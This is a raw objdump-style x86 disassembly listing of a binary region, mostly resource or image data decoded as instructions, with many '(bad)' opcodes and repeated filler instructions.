1101262b:	inc    DWORD PTR [eax]
1101262d:	add    BYTE PTR [eax],al
1101262f:	sti    
11012630:	add    BYTE PTR [eax],al
11012632:	add    dl,dl
11012634:	add    BYTE PTR [eax],al
11012636:	add    BYTE PTR [eax+0x7e000000],ch
1101263c:	add    BYTE PTR [eax],al
1101263e:	add    BYTE PTR [esi+0x0],dl
11012641:	add    BYTE PTR [eax],al
11012643:	cmp    BYTE PTR [eax],al
11012645:	add    BYTE PTR [eax],al
11012647:	add    BYTE PTR es:[eax],al
1101264a:	add    BYTE PTR [eax+eax*1],bl
1101264d:	add    BYTE PTR [eax],al
1101264f:	sbb    DWORD PTR [eax],eax
11012651:	add    BYTE PTR [eax],al
11012653:	sbb    BYTE PTR [eax],al
11012655:	add    BYTE PTR [eax],al
11012657:	sbb    BYTE PTR [eax],al
11012659:	add    BYTE PTR [eax],al
1101265b:	sbb    BYTE PTR [eax],al
1101265d:	add    BYTE PTR [eax],al
1101265f:	sbb    BYTE PTR [eax],al
11012661:	add    BYTE PTR [eax],al
11012663:	sbb    BYTE PTR [eax],al
11012665:	add    BYTE PTR [eax],al
11012667:	sbb    BYTE PTR [eax],al
11012669:	add    BYTE PTR [eax],al
1101266b:	pop    ss
1101266c:	add    BYTE PTR [eax],al
1101266e:	add    BYTE PTR [esi],dl
11012670:	add    BYTE PTR [eax],al
11012672:	add    BYTE PTR [edx],dl
11012674:	add    BYTE PTR [eax],al
11012676:	add    BYTE PTR [eax+eax*1],cl
11012679:	add    BYTE PTR [eax],al
1101267b:	push   es
1101267c:	add    BYTE PTR [eax],al
1101267e:	add    BYTE PTR [edx],al
	...
11012698:	add    BYTE PTR [eax],al
1101269a:	add    BYTE PTR [ecx],al
1101269c:	add    BYTE PTR [eax],al
1101269e:	add    BYTE PTR [esi],al
110126a0:	add    BYTE PTR [eax],al
110126a2:	add    BYTE PTR [ecx],dl
110126a4:	add    BYTE PTR [eax],al
110126a6:	add    BYTE PTR [ecx],ah
110126a8:	add    BYTE PTR [eax],al
110126aa:	add    BYTE PTR [ecx],dh
110126ac:	add    BYTE PTR [eax],al
110126ae:	add    BYTE PTR [ebx],bh
110126b0:	add    BYTE PTR [eax],al
110126b2:	add    BYTE PTR [eax+0x0],al
110126b5:	add    BYTE PTR [eax],al
110126b7:	inc    ecx
110126b8:	add    BYTE PTR [eax],al
110126ba:	add    BYTE PTR [ecx+0x0],al
110126bd:	add    BYTE PTR [eax],al
110126bf:	inc    edx
110126c0:	add    BYTE PTR [eax],al
110126c2:	add    BYTE PTR [ebp+0x0],al
110126c5:	add    BYTE PTR [eax],al
110126c7:	dec    ebp
110126c8:	add    BYTE PTR [eax],al
110126ca:	add    BYTE PTR [eax+eax*1+0x0],bl
110126ce:	add    BYTE PTR [eax+eax*1+0x0],dh
110126d2:	add    BYTE PTR [ebp-0x49000000],dl
110126d8:	add    BYTE PTR [eax],al
110126da:	add    dl,bl
110126dc:	add    BYTE PTR [eax],al
110126de:	add    ah,bh
110126e0:	pop    ds
110126e1:	pop    ds
110126e2:	pop    ds
110126e3:	(bad)  
110126e4:	fcmovu st,st(2)
110126e6:	(bad)  
110126e8:	fcomp  st(0)
110126ea:	fdivr  st,st(7)
110126ec:	sbb    eax,0xff1d1d
110126f1:	add    BYTE PTR [eax],al
110126f3:	cld    
110126f4:	add    BYTE PTR [eax],al
110126f6:	add    cl,bl
110126f8:	add    BYTE PTR [eax],al
110126fa:	add    BYTE PTR [edi-0x6b000000],dh
11012700:	add    BYTE PTR [eax],al
11012702:	add    BYTE PTR [eax+eax*1+0x0],dh
11012706:	add    BYTE PTR [eax+eax*1+0x0],bl
1101270a:	add    BYTE PTR [eax+eax*1+0x0],cl
1101270e:	add    BYTE PTR [ebp+0x0],al
11012711:	add    BYTE PTR [eax],al
11012713:	inc    edx
11012714:	add    BYTE PTR [eax],al
11012716:	add    BYTE PTR [ecx+0x0],al
11012719:	add    BYTE PTR [eax],al
1101271b:	inc    ecx
1101271c:	add    BYTE PTR [eax],al
1101271e:	add    BYTE PTR [ecx+0x0],al
11012721:	add    BYTE PTR [eax],al
11012723:	inc    ecx
11012724:	add    BYTE PTR [eax],al
11012726:	add    BYTE PTR [ecx+0x0],al
11012729:	add    BYTE PTR [eax],al
1101272b:	inc    eax
1101272c:	add    BYTE PTR [eax],al
1101272e:	add    BYTE PTR [ebx],bh
11012730:	add    BYTE PTR [eax],al
11012732:	add    BYTE PTR [ecx],dh
11012734:	add    BYTE PTR [eax],al
11012736:	add    BYTE PTR [ecx],ah
11012738:	add    BYTE PTR [eax],al
1101273a:	add    BYTE PTR [ecx],dl
1101273c:	add    BYTE PTR [eax],al
1101273e:	add    BYTE PTR [esi],al
11012740:	add    BYTE PTR [eax],al
11012742:	add    BYTE PTR [ecx],al
	...
11012758:	add    BYTE PTR [eax],al
1101275a:	add    BYTE PTR [ebx],al
1101275c:	add    BYTE PTR [eax],al
1101275e:	add    BYTE PTR [eax+eax*1],cl
11012761:	add    BYTE PTR [eax],al
11012763:	and    DWORD PTR [eax],eax
11012765:	add    BYTE PTR [eax],al
11012767:	inc    eax
11012768:	add    BYTE PTR [eax],al
1101276a:	add    BYTE PTR [edi+0x0],bl
1101276d:	add    BYTE PTR [eax],al
1101276f:	je     0x11012771
11012771:	add    BYTE PTR [eax],al
11012773:	jge    0x11012775
11012775:	add    BYTE PTR [eax],al
11012777:	jg     0x11012779
11012779:	add    BYTE PTR [eax],al
1101277b:	add    BYTE PTR [eax],0x0
1101277e:	add    BYTE PTR [edx-0x79000000],al
11012784:	add    BYTE PTR [eax],al
11012786:	add    BYTE PTR [ecx-0x5f000000],dl
1101278c:	add    BYTE PTR [eax],al
1101278e:	add    BYTE PTR [edi-0x32000000],dh
11012794:	add    BYTE PTR [eax],al
11012796:	add    ch,ah
11012798:	add    BYTE PTR [eax],al
1101279a:	add    ah,bh
1101279c:	pop    ds
1101279d:	pop    ds
1101279e:	pop    ds
1101279f:	(bad)  
110127a0:	(bad)  
110127a2:	fcos   
110127a4:	std    
110127a5:	std    
110127a6:	std    
110127a7:	(bad)  
110127a8:	std    
110127a9:	std    
110127aa:	std    
110127ab:	call   edi
110127ad:	xlat   BYTE PTR ds:[ebx]
110127ae:	xlat   BYTE PTR ds:[ebx]
110127af:	call   FWORD PTR ds:0xff1d1d
110127b5:	add    BYTE PTR [eax],al
110127b7:	cld    
110127b8:	add    BYTE PTR [eax],al
110127ba:	add    ch,ah
110127bc:	add    BYTE PTR [eax],al
110127be:	add    dh,cl
110127c0:	add    BYTE PTR [eax],al
110127c2:	add    BYTE PTR [edi-0x5f000000],dh
110127c8:	add    BYTE PTR [eax],al
110127ca:	add    BYTE PTR [ecx-0x79000000],dl
110127d0:	add    BYTE PTR [eax],al
110127d2:	add    BYTE PTR [edx-0x80000000],al
110127d8:	add    BYTE PTR [eax],al
110127da:	add    BYTE PTR [edi+0x0],bh
110127dd:	add    BYTE PTR [eax],al
110127df:	jg     0x110127e1
110127e1:	add    BYTE PTR [eax],al
110127e3:	jg     0x110127e5
110127e5:	add    BYTE PTR [eax],al
110127e7:	jg     0x110127e9
110127e9:	add    BYTE PTR [eax],al
110127eb:	jge    0x110127ed
110127ed:	add    BYTE PTR [eax],al
110127ef:	je     0x110127f1
110127f1:	add    BYTE PTR [eax],al
110127f3:	pop    edi
110127f4:	add    BYTE PTR [eax],al
110127f6:	add    BYTE PTR [eax+0x0],al
110127f9:	add    BYTE PTR [eax],al
110127fb:	and    DWORD PTR [eax],eax
110127fd:	add    BYTE PTR [eax],al
110127ff:	or     al,0x0
11012801:	add    BYTE PTR [eax],al
11012803:	add    eax,DWORD PTR [eax]
	...
11012819:	add    BYTE PTR [eax],al
1101281b:	add    al,0x0
1101281d:	add    BYTE PTR [eax],al
1101281f:	adc    al,BYTE PTR [eax]
11012821:	add    BYTE PTR [eax],al
11012823:	xor    DWORD PTR [eax],eax
11012825:	add    BYTE PTR [eax],al
11012827:	pop    edi
11012828:	add    BYTE PTR [eax],al
1101282a:	add    BYTE PTR [ebp-0x54000000],cl
11012830:	add    BYTE PTR [eax],al
11012832:	add    BYTE PTR [ecx-0x43000000],bh
11012838:	add    BYTE PTR [eax],al
1101283a:	add    BYTE PTR [edi-0x3f000000],bh
11012840:	add    BYTE PTR [eax],al
11012842:	add    dh,al
11012844:	add    BYTE PTR [eax],al
11012846:	add    bh,cl
11012848:	add    BYTE PTR [eax],al
1101284a:	add    dl,bl
1101284c:	add    BYTE PTR [eax],al
1101284e:	add    dh,ah
11012850:	add    BYTE PTR [eax],al
11012852:	add    cl,dh
11012854:	add    BYTE PTR [eax],al
11012856:	add    dh,bh
11012858:	sbb    eax,0xdaff1d1d
1101285d:	fcmovu st,st(2)
1101285f:	(bad)  
11012860:	std    
11012861:	std    
11012862:	std    
11012863:	(bad)  
11012864:	std    
11012865:	std    
11012866:	std    
11012867:	(bad)  
11012868:	std    
11012869:	std    
1101286a:	std    
1101286b:	(bad)  
1101286c:	std    
1101286d:	std    
1101286e:	std    
1101286f:	(bad)  
11012870:	fcomp  st(0)
11012872:	fdivr  st,st(7)
11012874:	sbb    al,0x1c
11012876:	sbb    al,0xff
11012878:	add    BYTE PTR [eax],al
1101287a:	add    ch,bh
1101287c:	add    BYTE PTR [eax],al
1101287e:	add    cl,dh
11012880:	add    BYTE PTR [eax],al
11012882:	add    dh,ah
11012884:	add    BYTE PTR [eax],al
11012886:	add    dl,bl
11012888:	add    BYTE PTR [eax],al
1101288a:	add    bh,cl
1101288c:	add    BYTE PTR [eax],al
1101288e:	add    dh,al
11012890:	add    BYTE PTR [eax],al
11012892:	add    cl,al
11012894:	add    BYTE PTR [eax],al
11012896:	add    BYTE PTR [edi-0x42000000],bh
1101289c:	add    BYTE PTR [eax],al
1101289e:	add    BYTE PTR [esi-0x42000000],bh
110128a4:	add    BYTE PTR [eax],al
110128a6:	add    BYTE PTR [ebp-0x47000000],bh
110128ac:	add    BYTE PTR [eax],al
110128ae:	add    BYTE PTR [eax+eax*1+0x8d0000],ch
110128b5:	add    BYTE PTR [eax],al
110128b7:	pop    edi
110128b8:	add    BYTE PTR [eax],al
110128ba:	add    BYTE PTR [ecx],dh
110128bc:	add    BYTE PTR [eax],al
110128be:	add    BYTE PTR [edx],dl
110128c0:	add    BYTE PTR [eax],al
110128c2:	add    BYTE PTR [eax+eax*1],al
	...
110128d9:	add    BYTE PTR [eax],al
110128db:	add    eax,0x16000000
110128e0:	add    BYTE PTR [eax],al
110128e2:	add    bh,bh
110128e4:	add    BYTE PTR [eax],al
110128e6:	add    bh,bh
110128e8:	add    BYTE PTR [eax],al
110128ea:	add    bh,bh
110128ec:	add    BYTE PTR [eax],al
110128ee:	add    bh,bh
110128f0:	add    BYTE PTR [eax],al
110128f2:	add    bh,bh
110128f4:	add    BYTE PTR [eax],al
110128f6:	add    bh,bh
110128f8:	add    BYTE PTR [eax],al
110128fa:	add    bh,bh
110128fc:	add    BYTE PTR [eax],al
110128fe:	add    bh,bh
11012900:	add    BYTE PTR [eax],al
11012902:	add    bh,bh
11012904:	add    BYTE PTR [eax],al
11012906:	add    bh,bh
11012908:	add    BYTE PTR [eax],al
1101290a:	add    bh,bh
1101290c:	add    BYTE PTR [eax],al
1101290e:	add    bh,bh
11012910:	add    BYTE PTR [eax],al
11012912:	add    bh,bh
11012914:	pop    ds
11012915:	pop    ds
11012916:	pop    ds
11012917:	(bad)  
11012918:	(bad)  
1101291a:	fcos   
1101291c:	std    
1101291d:	std    
1101291e:	std    
1101291f:	(bad)  
11012920:	std    
11012921:	std    
11012922:	std    
11012923:	(bad)  
11012924:	std    
11012925:	std    
11012926:	std    
11012927:	(bad)  
11012928:	std    
11012929:	std    
1101292a:	std    
1101292b:	(bad)  
1101292c:	std    
1101292d:	std    
1101292e:	std    
1101292f:	(bad)  
11012930:	std    
11012931:	std    
11012932:	std    
11012933:	(bad)  
11012934:	fcomp  st(0)
11012936:	fdivr  st,st(7)
11012938:	push   ds
11012939:	push   ds
1101293a:	push   ds
1101293b:	inc    DWORD PTR [eax]
1101293d:	add    BYTE PTR [eax],al
1101293f:	inc    DWORD PTR [eax]
11012941:	add    BYTE PTR [eax],al
11012943:	inc    DWORD PTR [eax]
11012945:	add    BYTE PTR [eax],al
11012947:	inc    DWORD PTR [eax]
11012949:	add    BYTE PTR [eax],al
1101294b:	inc    DWORD PTR [eax]
1101294d:	add    BYTE PTR [eax],al
1101294f:	inc    DWORD PTR [eax]
11012951:	add    BYTE PTR [eax],al
11012953:	inc    DWORD PTR [eax]
11012955:	add    BYTE PTR [eax],al
11012957:	inc    DWORD PTR [eax]
11012959:	add    BYTE PTR [eax],al
1101295b:	inc    DWORD PTR [eax]
1101295d:	add    BYTE PTR [eax],al
1101295f:	inc    DWORD PTR [eax]
11012961:	add    BYTE PTR [eax],al
11012963:	inc    DWORD PTR [eax]
11012965:	add    BYTE PTR [eax],al
11012967:	inc    DWORD PTR [eax]
11012969:	add    BYTE PTR [eax],al
1101296b:	inc    DWORD PTR [eax]
1101296d:	add    BYTE PTR [eax],al
1101296f:	inc    DWORD PTR [eax]
11012971:	add    BYTE PTR [eax],al
11012973:	lods   al,BYTE PTR ds:[esi]
11012974:	add    BYTE PTR [eax],al
11012976:	add    BYTE PTR [ebx+0x0],dh
11012979:	add    BYTE PTR [eax],al
1101297b:	cmp    eax,DWORD PTR [eax]
1101297d:	add    BYTE PTR [eax],al
1101297f:	push   ss
11012980:	add    BYTE PTR [eax],al
11012982:	add    BYTE PTR ds:0x0,al
	...
11012998:	add    BYTE PTR [eax],al
1101299a:	add    BYTE PTR [esi],al
1101299c:	add    BYTE PTR [eax],al
1101299e:	add    BYTE PTR [eax],bl
110129a0:	add    BYTE PTR [eax],al
110129a2:	add    bh,bh
110129a4:	cmp    al,0x22
110129a6:	push   ss
110129a7:	(bad)  
110129a8:	jns    0x110129ee
110129aa:	sub    eax,0x2d4479ff
110129af:	push   DWORD PTR [esi+0x43]
110129b2:	sub    al,0xff
110129b4:	jo     0x110129f5
110129b6:	sub    edi,edi
110129b8:	cmp    DWORD PTR gs:0x1e2f53ff,esp
110129bf:	(bad)  
110129c0:	cmp    eax,0x27ff1622
110129c5:	push   ss
110129c6:	push   cs
110129c7:	call   DWORD PTR [eax]
110129c9:	or     DWORD PTR ds:0xff,eax
110129cf:	call   FWORD PTR [edi]
110129d1:	pop    ds
110129d2:	pop    ds
110129d3:	(bad)  
110129d4:	(bad)  
110129d6:	fcos   
110129d8:	(bad)  
110129d9:	(bad)  
110129da:	(bad)  
110129db:	(bad)  
110129dc:	(bad)  
110129dd:	(bad)  
110129de:	std    
110129df:	(bad)  
110129e0:	(bad)  
110129e1:	(bad)  
110129e2:	std    
110129e3:	(bad)  
110129e4:	(bad)  
110129e5:	(bad)  
110129e6:	(bad)  
110129e7:	(bad)  
110129e8:	(bad)  
110129e9:	(bad)  
110129ea:	std    
110129eb:	(bad)  
110129ec:	(bad)  
110129ed:	(bad)  
110129ee:	(bad)  
110129ef:	(bad)  
110129f0:	(bad)  
110129f1:	(bad)  
110129f2:	(bad)  
110129f3:	(bad)  
110129f4:	(bad)  
110129f5:	(bad)  
110129f6:	(bad)  
110129f7:	call   edi
110129f9:	xlat   BYTE PTR ds:[ebx]
110129fa:	xlat   BYTE PTR ds:[ebx]
110129fb:	call   FWORD PTR [esi]
110129fd:	push   ds
110129fe:	push   ds
110129ff:	inc    DWORD PTR [eax]
11012a01:	add    BYTE PTR [eax],al
11012a03:	call   DWORD PTR [eax]
11012a05:	or     DWORD PTR ds:0xe1627ff,eax
11012a0b:	(bad)  
11012a0c:	cmp    eax,0x53ff1622
11012a11:	das    
11012a12:	pop    ds
11012a13:	jmp    DWORD PTR [ebp+0x39]
11012a16:	and    eax,0x293f70ff
11012a1b:	push   DWORD PTR [esi+0x43]
11012a1e:	sub    al,0xff
11012a20:	jns    0x11012a66
11012a22:	sub    eax,0x2d4479ff
11012a27:	(bad)  
11012a28:	cmp    al,0x22
11012a2a:	push   ss
11012a2b:	inc    DWORD PTR [eax]
11012a2d:	add    BYTE PTR [eax],al
11012a2f:	inc    DWORD PTR [eax]
11012a31:	add    BYTE PTR [eax],al
11012a33:	mov    ecx,0x7d000000
11012a38:	add    BYTE PTR [eax],al
11012a3a:	add    BYTE PTR [eax+0x0],al
11012a3d:	add    BYTE PTR [eax],al
11012a3f:	sbb    BYTE PTR [eax],al
11012a41:	add    BYTE PTR [eax],al
11012a43:	push   es
	...
11012a58:	add    BYTE PTR [eax],al
11012a5a:	add    BYTE PTR [esi],al
11012a5c:	add    BYTE PTR [eax],al
11012a5e:	add    BYTE PTR [eax],bl
11012a60:	add    BYTE PTR [eax],al
11012a62:	add    bh,bh
11012a64:	jns    0x11012aaa
11012a66:	sub    eax,0x5a89f3ff
11012a6b:	(bad)  
11012a6c:	out    dx,eax
11012a6d:	xchg   DWORD PTR [eax-0x1],ebx
11012a70:	in     al,0x81
11012a72:	push   esp
11012a73:	call   ecx
11012a75:	jbe    0x11012ac4
11012a77:	push   DWORD PTR [eax-0x7800be9c]
11012a7d:	dec    esp
11012a7e:	xor    edi,edi
11012a80:	pop    edx
11012a81:	xor    esp,DWORD PTR [ecx]
11012a83:	jmp    FWORD PTR [esi]
11012a85:	sbb    dl,BYTE PTR [ecx]
11012a87:	inc    DWORD PTR [edx+eax*1]
11012a8a:	add    edi,edi
11012a8c:	sbb    eax,0xdaff1d1d
11012a91:	fcmovu st,st(2)
11012a93:	(bad)  
11012a94:	(bad)  
11012a95:	(bad)  
11012a96:	std    
11012a97:	(bad)  
11012a98:	(bad)  
11012a99:	(bad)  
11012a9a:	(bad)  
11012a9b:	(bad)  
11012a9c:	(bad)  
11012a9d:	(bad)  
11012a9e:	std    
11012a9f:	(bad)  
11012aa0:	(bad)  
11012aa1:	(bad)  
11012aa2:	std    
11012aa3:	(bad)  
11012aa4:	(bad)  
11012aa5:	(bad)  
11012aa6:	(bad)  
11012aa7:	(bad)  
11012aa8:	std    
11012aa9:	std    
11012aaa:	std    
11012aab:	(bad)  
11012aac:	(bad)  
11012aad:	(bad)  
11012aae:	(bad)  
11012aaf:	(bad)  
11012ab0:	(bad)  
11012ab1:	(bad)  
11012ab2:	(bad)  
11012ab3:	(bad)  
11012ab4:	(bad)  
11012ab5:	(bad)  
11012ab6:	(bad)  
11012ab7:	(bad)  
11012ab8:	(bad)  
11012ab9:	(bad)  
11012aba:	std    
11012abb:	(bad)  
11012abc:	fcomp  st(0)
11012abe:	fdivr  st,st(7)
11012ac0:	sbb    al,0x1c
11012ac2:	sbb    al,0xff
11012ac4:	add    eax,DWORD PTR [edx]
11012ac6:	add    edi,edi
11012ac8:	sbb    DWORD PTR cs:[eax],edx
11012acb:	call   FWORD PTR [edx+0x33]
11012ace:	and    edi,edi
11012ad0:	xchg   DWORD PTR [edx+esi*1-0x1],ecx
11012ad4:	mov    cl,0x64
11012ad6:	inc    ecx
11012ad7:	call   ecx
11012ad9:	jbe    0x11012b28
11012adb:	jmp    esp
11012add:	adc    DWORD PTR [ebp-0x1],0xff5987ef
11012ae4:	xrelease mov DWORD PTR [edx-0x1],ebx
11012ae8:	jns    0x11012b2e
11012aea:	sub    eax,0xff
11012aef:	inc    DWORD PTR [eax]
11012af1:	add    BYTE PTR [eax],al
11012af3:	mov    ebp,0x7f000000
11012af8:	add    BYTE PTR [eax],al
11012afa:	add    BYTE PTR [ecx+0x0],al
11012afd:	add    BYTE PTR [eax],al
11012aff:	sbb    BYTE PTR [eax],al
11012b01:	add    BYTE PTR [eax],al
11012b03:	push   es
	...
11012b18:	add    BYTE PTR [eax],al
11012b1a:	add    BYTE PTR [esi],al
11012b1c:	add    BYTE PTR [eax],al
11012b1e:	add    BYTE PTR [eax],bl
11012b20:	add    BYTE PTR [eax],al
11012b22:	add    bh,bh
11012b24:	jns    0x11012b6a
11012b26:	sub    eax,0x5887efff
11012b2b:	jmp    esp
11012b2d:	adc    DWORD PTR [edi+edi*8-0x30],0xb0ff4d76
11012b35:	fs inc ecx
11012b37:	inc    DWORD PTR [esi+0x5aff314c]
11012b3d:	xor    esp,DWORD PTR [ecx]
11012b3f:	jmp    FWORD PTR [esi]
11012b41:	sbb    dl,BYTE PTR [ecx]
11012b43:	inc    DWORD PTR [ebx]
11012b45:	add    al,BYTE PTR [ecx]
11012b47:	call   FWORD PTR [edi]
11012b49:	pop    ds
11012b4a:	pop    ds
11012b4b:	(bad)  
11012b4c:	fcmovu st,st(2)
11012b4e:	(bad)  
11012b50:	(bad)  
11012b51:	(bad)  
11012b52:	std    
11012b53:	(bad)  
11012b54:	(bad)  
11012b55:	(bad)  
11012b56:	std    
11012b57:	(bad)  
11012b58:	(bad)  
11012b59:	(bad)  
11012b5a:	std    
11012b5b:	(bad)  
11012b5c:	std    
11012b5d:	std    
11012b5e:	std    
11012b5f:	(bad)  
11012b60:	(bad)  
11012b61:	(bad)  
11012b62:	std    
11012b63:	(bad)  
11012b64:	(bad)  
11012b65:	(bad)  
11012b66:	std    
11012b67:	(bad)  
11012b68:	std    
11012b69:	std    
11012b6a:	std    
11012b6b:	(bad)  
11012b6c:	(bad)  
11012b6d:	(bad)  
11012b6e:	(bad)  
11012b6f:	(bad)  
11012b70:	(bad)  
11012b71:	(bad)  
11012b72:	(bad)  
11012b73:	(bad)  
11012b74:	(bad)  
11012b75:	(bad)  
11012b76:	(bad)  
11012b77:	(bad)  
11012b78:	(bad)  
11012b79:	(bad)  
11012b7a:	std    
11012b7b:	(bad)  
11012b7c:	std    
11012b7d:	std    
11012b7e:	std    
11012b7f:	(bad)  
11012b80:	fcomp  st(0)
11012b82:	fdivr  st,st(7)
11012b84:	push   ds
11012b85:	push   ds
11012b86:	sbb    eax,0x10203ff
11012b8b:	jmp    FWORD PTR [esi]
11012b8d:	sbb    dl,BYTE PTR [ecx]
11012b8f:	call   FWORD PTR [edx+0x33]
11012b92:	and    edi,edi
11012b94:	xchg   DWORD PTR [edx+esi*1-0x1],ecx
11012b98:	mov    cl,0x64
11012b9a:	inc    ecx
11012b9b:	call   ecx
11012b9d:	jbe    0x11012bec
11012b9f:	jmp    esp
11012ba1:	adc    DWORD PTR [ebp-0x1],0xff5987ef
11012ba8:	jns    0x11012bee
11012baa:	sub    eax,0xff
11012baf:	inc    DWORD PTR [eax]
11012bb1:	add    BYTE PTR [eax],al
11012bb3:	mov    esi,0x7f000000
11012bb8:	add    BYTE PTR [eax],al
11012bba:	add    BYTE PTR [ecx+0x0],al
11012bbd:	add    BYTE PTR [eax],al
11012bbf:	sbb    BYTE PTR [eax],al
11012bc1:	add    BYTE PTR [eax],al
11012bc3:	push   es
	...
11012bd8:	add    BYTE PTR [eax],al
11012bda:	add    BYTE PTR [esi],al
11012bdc:	add    BYTE PTR [eax],al
11012bde:	add    BYTE PTR [eax],bl
11012be0:	add    BYTE PTR [eax],al
11012be2:	add    bh,bh
11012be4:	jbe    0x11012c29
11012be6:	sub    al,0xff
11012be8:	in     eax,0x81
11012bea:	push   ebp
11012beb:	call   ecx
11012bed:	jbe    0x11012c3c
11012bef:	push   DWORD PTR [ecx-0x7800be9c]
11012bf5:	dec    esp
11012bf6:	xor    bh,bh
11012bf8:	pop    edx
11012bf9:	xor    esp,DWORD PTR [ecx]
11012bfb:	jmp    FWORD PTR [esi]
11012bfd:	sbb    dl,BYTE PTR [eax]
11012bff:	inc    DWORD PTR [edx+eax*1]
11012c02:	add    edi,edi
11012c04:	pop    ds
11012c05:	pop    ds
11012c06:	pop    ds
11012c07:	(bad)  
11012c08:	(bad)  
11012c0a:	fcos   
11012c0c:	(bad)  
11012c0d:	(bad)  
11012c0e:	std    
11012c0f:	(bad)  
11012c10:	std    
11012c11:	std    
11012c12:	std    
11012c13:	(bad)  
11012c14:	(bad)  
11012c15:	(bad)  
11012c16:	std    
11012c17:	(bad)  
11012c18:	(bad)  
11012c19:	(bad)  
11012c1a:	std    
11012c1b:	(bad)  
11012c1c:	(bad)  
11012c1d:	(bad)  
11012c1e:	std    
11012c1f:	(bad)  
11012c20:	std    
11012c21:	std    
11012c22:	std    
11012c23:	(bad)  
11012c24:	(bad)  
11012c25:	(bad)  
11012c26:	std    
11012c27:	(bad)  
11012c28:	(bad)  
11012c29:	(bad)  
11012c2a:	std    
11012c2b:	(bad)  
11012c2c:	(bad)  
11012c2d:	(bad)  
11012c2e:	(bad)  
11012c2f:	(bad)  
11012c30:	(bad)  
11012c31:	(bad)  
11012c32:	std    
11012c33:	(bad)  
11012c34:	(bad)  
11012c35:	(bad)  
11012c36:	(bad)  
11012c37:	(bad)  
11012c38:	(bad)  
11012c39:	(bad)  
11012c3a:	(bad)  
11012c3b:	(bad)  
11012c3c:	std    
11012c3d:	std    
11012c3e:	std    
11012c3f:	(bad)  
11012c40:	std    
11012c41:	std    
11012c42:	std    
11012c43:	call   edi
11012c45:	xlat   BYTE PTR ds:[ebx]
11012c46:	xlat   BYTE PTR ds:[ebx]
11012c47:	call   FWORD PTR [esi]
11012c49:	push   ds
11012c4a:	sbb    eax,0x10204ff
11012c4f:	jmp    FWORD PTR [esi]
11012c51:	sbb    dl,BYTE PTR [ecx]
11012c53:	call   FWORD PTR [edx+0x33]
11012c56:	and    edi,edi
11012c58:	xchg   DWORD PTR [edx+esi*1-0x1],ecx
11012c5c:	mov    cl,0x64
11012c5e:	inc    edx
11012c5f:	call   ecx
11012c61:	jbe    0x11012cb1
11012c63:	jmp    ebp
11012c65:	adc    DWORD PTR [ebp-0x1],0xff2c4376
11012c6c:	add    BYTE PTR [eax],al
11012c6e:	add    bh,bh
11012c70:	add    BYTE PTR [eax],al
11012c72:	add    BYTE PTR [esi+0x7f000000],bh
11012c78:	add    BYTE PTR [eax],al
11012c7a:	add    BYTE PTR [ecx+0x0],al
11012c7d:	add    BYTE PTR [eax],al
11012c7f:	sbb    BYTE PTR [eax],al
11012c81:	add    BYTE PTR [eax],al
11012c83:	push   es
	...
11012c98:	add    BYTE PTR [eax],al
11012c9a:	add    BYTE PTR [esi],al
11012c9c:	add    BYTE PTR [eax],al
11012c9e:	add    BYTE PTR [eax],bl
11012ca0:	add    BYTE PTR [eax],al
11012ca2:	add    bh,bh
11012ca4:	jo     0x11012ce5
11012ca6:	sub    edi,edi
11012ca8:	shl    DWORD PTR [esi+0x4e],1
11012cab:	push   DWORD PTR [ecx-0x7800be9c]
11012cb1:	dec    esp
11012cb2:	xor    bh,bh
11012cb4:	pop    ebx
11012cb5:	xor    esp,DWORD PTR [ecx]
11012cb7:	jmp    FWORD PTR [esi]
11012cb9:	sbb    dl,BYTE PTR [ecx]
11012cbb:	inc    DWORD PTR [ebx]
11012cbd:	add    al,BYTE PTR [ecx]
11012cbf:	call   FWORD PTR ds:0xdaff1d1d
11012cc5:	fcmovu st,st(1)
11012cc7:	(bad)  
11012cc8:	std    
11012cc9:	std    
11012cca:	std    
11012ccb:	(bad)  
11012ccc:	(bad)  
11012ccd:	(bad)  
11012cce:	std    
11012ccf:	(bad)  
11012cd0:	std    
11012cd1:	std    
11012cd2:	std    
11012cd3:	(bad)  
11012cd4:	(bad)  
11012cd5:	(bad)  
11012cd6:	std    
11012cd7:	(bad)  
11012cd8:	(bad)  
11012cd9:	(bad)  
11012cda:	std    
11012cdb:	(bad)  
11012cdc:	(bad)  
11012cdd:	(bad)  
11012cde:	std    
11012cdf:	(bad)  
11012ce0:	std    
11012ce1:	std    
11012ce2:	std    
11012ce3:	(bad)  
11012ce4:	std    
11012ce5:	std    
11012ce6:	std    
11012ce7:	(bad)  
11012ce8:	(bad)  
11012ce9:	(bad)  
11012cea:	std    
11012ceb:	(bad)  
11012cec:	(bad)  
11012ced:	(bad)  
11012cee:	std    
11012cef:	(bad)  
11012cf0:	std    
11012cf1:	std    
11012cf2:	std    
11012cf3:	(bad)  
11012cf4:	(bad)  
11012cf5:	(bad)  
11012cf6:	(bad)  
11012cf7:	(bad)  
11012cf8:	(bad)  
11012cf9:	(bad)  
11012cfa:	std    
11012cfb:	(bad)  
11012cfc:	std    
11012cfd:	std    
11012cfe:	std    
11012cff:	(bad)  
11012d00:	std    
11012d01:	std    
11012d02:	std    
11012d03:	(bad)  
11012d04:	std    
11012d05:	std    
11012d06:	std    
11012d07:	(bad)  
11012d08:	fcomp  st(0)
11012d0a:	fdivr  st,st(7)
11012d0c:	sbb    al,0x1c
11012d0e:	sbb    edi,edi
11012d10:	add    al,0x2
11012d12:	add    edi,edi
11012d14:	sbb    dl,BYTE PTR cs:[ecx]
11012d17:	call   FWORD PTR [ebx+0x33]
11012d1a:	and    edi,edi
11012d1c:	mov    BYTE PTR [edx+esi*1-0x1],cl
11012d20:	mov    cl,0x64
11012d22:	inc    ecx
11012d23:	call   ecx
11012d25:	jbe    0x11012d75
11012d27:	push   DWORD PTR [eax+0x3f]
11012d2a:	sub    edi,edi
11012d2c:	add    BYTE PTR [eax],al
11012d2e:	add    bh,bh
11012d30:	add    BYTE PTR [eax],al
11012d32:	add    BYTE PTR [esi+0x7f000000],bh
11012d38:	add    BYTE PTR [eax],al
11012d3a:	add    BYTE PTR [ecx+0x0],al
11012d3d:	add    BYTE PTR [eax],al
11012d3f:	sbb    BYTE PTR [eax],al
11012d41:	add    BYTE PTR [eax],al
11012d43:	push   es
	...
11012d58:	add    BYTE PTR [eax],al
11012d5a:	add    BYTE PTR [edi],al
11012d5c:	add    BYTE PTR [eax],al
11012d5e:	add    BYTE PTR [eax+eax*1],bl
11012d61:	add    BYTE PTR [eax],al
11012d63:	jmp    DWORD PTR [ebp+0x39]
11012d66:	and    eax,0x4164b0ff
11012d6b:	inc    DWORD PTR [esi+0x5aff314b]
11012d71:	xor    ah,BYTE PTR [ecx]
